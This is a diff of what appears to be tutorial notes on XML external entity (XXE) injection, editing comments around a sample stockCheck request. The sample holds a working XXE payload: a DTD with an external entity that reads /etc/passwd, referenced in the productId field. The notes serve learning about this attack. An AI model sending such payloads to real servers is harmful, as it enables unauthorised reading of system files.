@@ -6,10 +6,11 @@ eg for XML payload updated with the DTD tag and external entity:
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>     // DTD tag(we                                                                 // inserted this) 
+
 <stockCheck>
 <productId>
-&xxe;   // 
+&xxe;        // external entity(we inserted this)
 </productId>
 <storeId>
 1
